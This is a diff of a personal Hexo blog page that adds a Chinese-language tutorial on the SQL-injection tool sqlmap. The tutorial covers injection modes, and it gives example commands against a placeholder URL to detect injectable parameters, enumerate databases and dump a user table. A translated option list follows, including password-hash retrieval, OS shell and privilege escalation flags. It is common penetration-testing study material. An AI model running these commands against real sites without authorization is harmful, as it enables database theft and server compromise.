@@ -86,16 +86,25 @@
 
 
 
-<meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.">
+<meta name="description" content="简介sqlmap是渗透中常用的一个注入工具，使用python语言编写，简单易用，这里记下一些常用的并且网上搜集整理的使用方法，更多复杂的使用用上再说，主要记下最常用的sql注入一条龙命令。
+sqlmap支持五种不同的注入模式：
+
+1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。2、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。3、基于时间的盲注，即不能根据页">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="http://ug1y.github.io/2016/08/22/hello-world/index.html">
+<meta property="og:title" content="sqlmap使用笔记">
+<meta property="og:url" content="http://ug1y.github.io/2016/10/04/sqlmap使用笔记/index.html">
 <meta property="og:site_name" content="ugly's Notes">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.">
-<meta property="og:updated_time" content="2016-08-23T01:12:24.673Z">
+<meta property="og:description" content="简介sqlmap是渗透中常用的一个注入工具，使用python语言编写，简单易用，这里记下一些常用的并且网上搜集整理的使用方法，更多复杂的使用用上再说，主要记下最常用的sql注入一条龙命令。
+sqlmap支持五种不同的注入模式：
+
+1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。2、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。3、基于时间的盲注，即不能根据页">
+<meta property="og:updated_time" content="2016-10-04T04:03:28.405Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hello World">
-<meta name="twitter:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.">
+<meta name="twitter:title" content="sqlmap使用笔记">
+<meta name="twitter:description" content="简介sqlmap是渗透中常用的一个注入工具，使用python语言编写，简单易用，这里记下一些常用的并且网上搜集整理的使用方法，更多复杂的使用用上再说，主要记下最常用的sql注入一条龙命令。
+sqlmap支持五种不同的注入模式：
+
+1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。2、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。3、基于时间的盲注，即不能根据页">
 
 
 
@@ -116,9 +125,9 @@
 
 
 
-  <link rel="canonical" href="http://ug1y.github.io/2016/08/22/hello-world/"/>
+  <link rel="canonical" href="http://ug1y.github.io/2016/10/04/sqlmap使用笔记/"/>
 
-  <title> Hello World | ugly's Notes </title>
+  <title> sqlmap使用笔记 | ugly's Notes </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -291,7 +300,7 @@
             
             
               
-                Hello World
+                sqlmap使用笔记
               
             
           </h1>
@@ -303,8 +312,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-08-22T14:24:55+08:00" content="2016-08-22">
-              2016-08-22
+            <time itemprop="dateCreated" datetime="2016-10-04T10:21:31+08:00" content="2016-10-04">
+              2016-10-04
             </time>
           </span>
 
@@ -314,8 +323,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2016/08/22/hello-world/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/08/22/hello-world/" itemprop="commentsCount"></span>
+                <a href="/2016/10/04/sqlmap使用笔记/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/10/04/sqlmap使用笔记/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -338,16 +347,207 @@
       
 
       
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
+        <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>sqlmap是渗透中常用的一个注入工具，使用python语言编写，简单易用，这里记下一些常用的并且网上搜集整理的使用方法，更多复杂的使用用上再说，主要记下最常用的sql注入一条龙命令。</p>
+<p>sqlmap支持五种不同的注入模式：</p>
+<blockquote>
+<p>1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。<br>2、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。<br>3、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。<br>4、联合查询注入，可以使用union的情况下的注入。<br>5、堆查询注入，可以同时执行多条语句的执行时的注入。</p>
+</blockquote>
 <a id="more"></a>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
+<p>目前支持的数据库有MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB</p>
+<h1 id="注入点检测"><a href="#注入点检测" class="headerlink" title="注入点检测"></a>注入点检测</h1><p>这是进行注入的第一步，找到能够注入的参数，即注入点。</p>
+<p><strong>url请求注入：</strong><br><code>python sqlmap.py -u &quot;http://www.site.com/vuln.php?id=1&quot;</code><br><em>默认使用level1检测全部数据库类型</em><br><code>python sqlmap.py -u &quot;http://www.site.com/vuln.php?id=1&quot; --batch</code><br><em>使用默认配置运行，不询问用户的输入（比较常用）</em><br><code>python sqlmap.py -u &quot;http://www.site.com/vuln.php?id=1&quot; --dbms mysql --level 3</code><br><em>指定数据库类型为mysql，级别为3（共5级，级别越高检测程度越深，级别大于3时会检测http请求头）</em></p>
+<p><strong>post请求注入：</strong><br><code>python sqlmap.py -u &quot;http://www.site.com/vuln.php&quot; --data &quot;name=admin&amp;pass=1234&quot; -p &quot;name&quot;</code><br><em>输入data作为post请求的参数，-p指定username为注入点</em></p>
+<p><strong>cookie注入：</strong><br><code>python sqlmap.py -u &quot;http://www.site.com/vuln.php&quot; --cookie &quot;id=11&quot; --level 2</code><br><em>当level到2以上时才会检测cookie，一般常用来作为会话的输入保持登录状态</em></p>
+<h1 id="注入获取信息"><a href="#注入获取信息" class="headerlink" title="注入获取信息"></a>注入获取信息</h1><p>在上一步检测成功后，会显示成功的注入类型、名称和载荷并将这些成功的检测配置信息存入日志文件里，<strong>所以在这一步获取信息时，要带上检测时候输入的注入参数，在后面添加其他命令行参数执行。</strong></p>
+<p><strong>获取数据库基本信息：</strong><br><code>python sqlmap.py -u &quot;http://www.site.com/vuln.php&quot; --dbs</code><br><em>查询有哪些数据库</em><br><code>python sqlmap.py -u &quot;http://www.site.com/vuln.php&quot; -D test --tables</code><br><em>查询test数据库中有哪些表</em><br><code>python sqlmap.py -u &quot;http://www.site.com/vuln.php&quot; -D test -T user --columns</code><br><em>查询test数据库中user表有哪些字段</em><br><code>python sqlmap.py -u &quot;http://www.site.com/vuln.php&quot; -D test -T user --dump</code><br><em>导出test数据库中user表的所有内容</em></p>
+<h1 id="sqlmap详细命令"><a href="#sqlmap详细命令" class="headerlink" title="sqlmap详细命令"></a>sqlmap详细命令</h1><p>（转自<a href="http://www.vuln.cn/1992" target="_blank" rel="external">http://www.vuln.cn/1992</a>）</p>
+<ul>
+<li>–is-dba 当前用户权限（是否为root权限）</li>
+<li>–dbs 所有数据库</li>
+<li>–current-db 网站当前数据库</li>
+<li>–users 所有数据库用户</li>
+<li>–current-user 当前数据库用户</li>
+<li>–random-agent 构造随机user-agent</li>
+<li>–passwords 数据库密码</li>
+<li>–proxy <a href="http://local:8080" target="_blank" rel="external">http://local:8080</a> -threads 10 (可以自定义线程加速) 代理</li>
+<li>–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</li>
+</ul>
+<p><strong>Options（选项）：</strong></p>
+<ul>
+<li>–version 显示程序的版本号并退出</li>
+<li>-h, –-help 显示此帮助消息并退出</li>
+<li>-hh 显示更高级的帮助消息并退出</li>
+<li>-v VERBOSE 详细级别：0-6（默认为1）</li>
+</ul>
+<p><strong>Target（目标）：</strong></p>
+<p>以下至少需要设置其中一个选项，设置目标URL。</p>
+<ul>
+<li>-d DIRECT 直接连接到数据库。</li>
+<li>-u URL, –url=URL 目标URL。</li>
+<li>-l LIST 从Burp或WebScarab代理的日志中解析目标。</li>
+<li>-r REQUESTFILE 从一个文件中载入HTTP请求。</li>
+<li>-g GOOGLEDORK 处理Google dork的结果作为目标URL。</li>
+<li>-c CONFIGFILE 从INI配置文件中加载选项。</li>
+</ul>
+<p><strong>Request（请求）：</strong></p>
+<p>这些选项可以用来指定如何连接到目标URL。</p>
+<ul>
+<li>–data=DATA 通过POST发送的数据字符串</li>
+<li>–cookie=COOKIE HTTP Cookie头</li>
+<li>–cookie-urlencode URL 编码生成的cookie注入</li>
+<li>–drop-set-cookie 忽略响应的Set – Cookie头信息</li>
+<li>–user-agent=AGENT 指定 HTTP User – Agent头</li>
+<li>–random-agent 使用随机选定的HTTP User – Agent头</li>
+<li>–referer=REFERER 指定 HTTP Referer头</li>
+<li>–headers=HEADERS 换行分开，加入其他的HTTP头</li>
+<li>–auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)</li>
+<li>–auth-cred=ACRED HTTP身份验证凭据（用户名:密码）</li>
+<li>–auth-cert=ACERT HTTP认证证书（key_file，cert_file）</li>
+<li>–proxy=PROXY 使用HTTP代理连接到目标URL</li>
+<li>–proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）</li>
+<li>–ignore-proxy 忽略系统默认的HTTP代理</li>
+<li>–delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒</li>
+<li>–timeout=TIMEOUT 等待连接超时的时间（默认为30秒）</li>
+<li>–retries=RETRIES 连接超时后重新连接的时间（默认3）</li>
+<li>–scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式</li>
+<li>–safe-url=SAFURL 在测试过程中经常访问的url地址</li>
+<li>–safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL</li>
+</ul>
+<p><strong>Enumeration（枚举）：</strong></p>
+<p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行<br>您自己的SQL语句。</p>
+<ul>
+<li>-b, –banner 检索数据库管理系统的标识</li>
+<li>–current-user 检索数据库管理系统当前用户</li>
+<li>–current-db 检索数据库管理系统当前数据库</li>
+<li>–is-dba 检测DBMS当前用户是否DBA</li>
+<li>–users 枚举数据库管理系统用户</li>
+<li>–passwords 枚举数据库管理系统用户密码哈希</li>
+<li>–privileges 枚举数据库管理系统用户的权限</li>
+<li>–roles 枚举数据库管理系统用户的角色</li>
+<li>–dbs 枚举数据库管理系统数据库</li>
+<li>-D DBname 要进行枚举的指定数据库名</li>
+<li>-T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）</li>
+<li>–tables 枚举的DBMS数据库中的表</li>
+<li>–columns 枚举DBMS数据库表列</li>
+<li>–dump 转储数据库管理系统的数据库中的表项</li>
+<li>–dump-all 转储所有的DBMS数据库表中的条目</li>
+<li>–search 搜索列（S），表（S）和/或数据库名称（S）</li>
+<li>-C COL 要进行枚举的数据库列</li>
+<li>-U USER 用来进行枚举的数据库用户</li>
+<li>–exclude-sysdbs 枚举表时排除系统数据库</li>
+<li>–start=LIMITSTART 第一个查询输出进入检索</li>
+<li>–stop=LIMITSTOP 最后查询的输出进入检索</li>
+<li>–first=FIRSTCHAR 第一个查询输出字的字符检索</li>
+<li>–last=LASTCHAR 最后查询的输出字字符检索</li>
+<li>–sql-query=QUERY 要执行的SQL语句</li>
+<li>–sql-shell 提示交互式SQL的shell</li>
+</ul>
+<p><strong>Optimization（优化）：</strong></p>
+<p>这些选项可用于优化SqlMap的性能。</p>
+<ul>
+<li>-o 开启所有优化开关</li>
+<li>–predict-output 预测常见的查询输出</li>
+<li>–keep-alive 使用持久的HTTP（S）连接</li>
+<li>–null-connection 从没有实际的HTTP响应体中检索页面长度</li>
+<li>–threads=THREADS 最大的HTTP（S）请求并发量（默认为1）</li>
+</ul>
+<p><strong>Injection（注入）：</strong></p>
+<p>这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</p>
+<ul>
+<li>-p TESTPARAMETER 可测试的参数（S）</li>
+<li>–dbms=DBMS 强制后端的DBMS为此值</li>
+<li>–os=OS 强制后端的DBMS操作系统为这个值</li>
+<li>–prefix=PREFIX 注入payload字符串前缀</li>
+<li>–suffix=SUFFIX 注入payload字符串后缀</li>
+<li>–tamper=TAMPER 使用给定的脚本（S）篡改注入数据</li>
+</ul>
+<p><strong>Detection（检测）：</strong></p>
+<p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</p>
+<ul>
+<li>–level=LEVEL 执行测试的等级（1-5，默认为1）</li>
+<li>–risk=RISK 执行测试的风险（0-3，默认为1）</li>
+<li>–string=STRING 查询时有效时在页面匹配字符串</li>
+<li>–regexp=REGEXP 查询时有效时在页面匹配正则表达式</li>
+<li>–text-only 仅基于在文本内容比较网页</li>
+</ul>
+<p><strong>Techniques（技巧）：</strong></p>
+<p>这些选项可用于调整具体的SQL注入测试。</p>
+<ul>
+<li>–technique=TECH SQL注入技术测试（默认BEUST）</li>
+<li>–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</li>
+<li>–union-cols=UCOLS 定列范围用于测试UNION查询注入</li>
+<li>–union-char=UCHAR 用于暴力猜解列数的字符</li>
+</ul>
+<p><strong>Fingerprint（指纹）：</strong></p>
+<ul>
+<li>-f, –fingerprint 执行检查广泛的DBMS版本指纹</li>
+</ul>
+<p><strong>Brute force（蛮力）：</strong></p>
+<p>这些选项可以被用来运行蛮力检查。</p>
+<ul>
+<li>–common-tables 检查存在共同表</li>
+<li>–common-columns 检查存在共同列</li>
+</ul>
+<p><strong>User-defined function injection（用户自定义函数注入）：</strong></p>
+<p>这些选项可以用来创建用户自定义函数。</p>
+<ul>
+<li>–udf-inject 注入用户自定义函数</li>
+<li>–shared-lib=SHLIB 共享库的本地路径</li>
+</ul>
+<p><strong>File system access（访问文件系统）：</strong></p>
+<p>这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p>
+<ul>
+<li>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件</li>
+<li>–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件</li>
+<li>–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</li>
+</ul>
+<p><strong>Operating system access（操作系统访问）：</strong></p>
+<p>这些选项可以用于访问后端数据库管理系统的底层操作系统。</p>
+<ul>
+<li>–os-cmd=OSCMD 执行操作系统命令</li>
+<li>–os-shell 交互式的操作系统的shell</li>
+<li>–os-pwn 获取一个OOB shell，meterpreter或VNC</li>
+<li>–os-smbrelay 一键获取一个OOB shell，meterpreter或VNC</li>
+<li>–os-bof 存储过程缓冲区溢出利用</li>
+<li>–priv-esc 数据库进程用户权限提升</li>
+<li>–msf-path=MSFPATH Metasploit Framework本地的安装路径</li>
+<li>–tmp-path=TMPPATH 远程临时文件目录的绝对路径</li>
+</ul>
+<p><strong>Windows注册表访问：</strong></p>
+<p>这些选项可以被用来访问后端数据库管理系统Windows注册表。</p>
+<ul>
+<li>–reg-read 读一个Windows注册表项值</li>
+<li>–reg-add 写一个Windows注册表项值数据</li>
+<li>–reg-del 删除Windows注册表键值</li>
+<li>–reg-key=REGKEY Windows注册表键</li>
+<li>–reg-value=REGVAL Windows注册表项值</li>
+<li>–reg-data=REGDATA Windows注册表键值数据</li>
+<li>–reg-type=REGTYPE Windows注册表项值类型</li>
+</ul>
+<p>这些选项可以用来设置一些一般的工作参数。</p>
+<ul>
+<li>-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中</li>
+<li>-s SESSIONFILE 保存和恢复检索会话文件的所有数据</li>
+<li>–flush-session 刷新当前目标的会话文件</li>
+<li>–fresh-queries 忽略在会话文件中存储的查询结果</li>
+<li>–eta 显示每个输出的预计到达时间</li>
+<li>–update 更新SqlMap</li>
+<li>–save file保存选项到INI配置文件</li>
+<li>–batch 从不询问用户输入，使用所有默认配置。</li>
+</ul>
+<p><strong>Miscellaneous（杂项）：</strong></p>
+<ul>
+<li>–beep 发现SQL注入时提醒</li>
+<li>–check-payload IDS对注入payloads的检测测试</li>
+<li>–cleanup SqlMap具体的UDF和表清理DBMS</li>
+<li>–forms 对目标URL的解析和测试形式</li>
+<li>–gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果</li>
+<li>–page-rank Google dork结果显示网页排名（PR）</li>
+<li>–parse-errors 从响应页面解析数据库管理系统的错误消息</li>
+<li>–replicate 复制转储的数据到一个sqlite3数据库</li>
+<li>–tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址</li>
+<li>–wizard 给初级用户的简单向导界面</li>
+</ul>
 
       
     </div>
@@ -373,13 +573,13 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2016/09/25/2017完美世界算法工程师笔试题(子序列)/" rel="next" title="2017完美世界算法工程师笔试题(子序列)">
+                <i class="fa fa-chevron-left"></i> 2017完美世界算法工程师笔试题(子序列)
+              </a>
+            
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/09/01/好用必备的web调试工具/" rel="prev" title="好用必备的web调试工具">
-                好用必备的web调试工具 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -408,8 +608,8 @@
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="2016/08/22/hello-world/"
-           data-title="Hello World" data-url="http://ug1y.github.io/2016/08/22/hello-world/">
+      <div class="ds-thread" data-thread-key="2016/10/04/sqlmap使用笔记/"
+           data-title="sqlmap使用笔记" data-url="http://ug1y.github.io/2016/10/04/sqlmap使用笔记/">
       </div>
     
   </div>
@@ -541,7 +741,7 @@
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Quick-Start"><span class="nav-number">1.</span> <span class="nav-text">Quick Start</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Create-a-new-post"><span class="nav-number">1.1.</span> <span class="nav-text">Create a new post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Run-server"><span class="nav-number">1.2.</span> <span class="nav-text">Run server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Generate-static-files"><span class="nav-number">1.3.</span> <span class="nav-text">Generate static files</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deploy-to-remote-sites"><span class="nav-number">1.4.</span> <span class="nav-text">Deploy to remote sites</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#简介"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#注入点检测"><span class="nav-number">2.</span> <span class="nav-text">注入点检测</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#注入获取信息"><span class="nav-number">3.</span> <span class="nav-text">注入获取信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sqlmap详细命令"><span class="nav-number">4.</span> <span class="nav-text">sqlmap详细命令</span></a></li></ol></div>
             
           </div>
         </section>
